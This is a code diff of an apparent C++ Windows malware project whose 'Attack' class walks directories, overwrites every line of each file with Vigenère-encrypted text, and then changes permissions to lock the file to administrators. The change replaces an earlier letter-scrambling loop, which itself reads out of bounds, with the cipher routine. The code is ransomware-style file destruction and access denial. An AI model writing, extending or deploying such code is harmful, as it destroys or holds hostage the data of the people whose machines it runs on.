@@ -1,4 +1,5 @@
 #include "attack.h"
+#include "cipher.h"
 
 void Attack::SetFilePermission(LPCWSTR filename)
 {
@@ -72,7 +73,7 @@ vector<wstring> Attack::list_n_kill_files(wstring path)
 				}
 				else {
 					string readout;
-					string replace;
+					string cipher_text;
 
 					std::cout << "Writing to file..." << std::endl;
 					// for read
@@ -83,15 +84,12 @@ vector<wstring> Attack::list_n_kill_files(wstring path)
 					{
 						std::cout << "Replacing line..." << std::endl;
 						std::cout << readout << std::endl << std::endl;
-						// replace each letter of word in file
-						for (int i = 0; i < (int)readout.length() + 1; i++)
-						{
-							// shift letters up one, power up 3
-							replace += readout[i + 1 ^ 3];
-						}
+						// Vigenère Cipher each word
+						string key = generateKey(readout, keyword);
+						cipher_text = encryptText(readout, key);
 						// append replaced strings to file
-						outfile << replace + "\n";
-						replace.clear();
+						outfile << cipher_text + "\n";
+						cipher_text.clear();
 					}
 					// set file permissions to admin if not admin : lock
 					SetFilePermission(file_path.c_str());
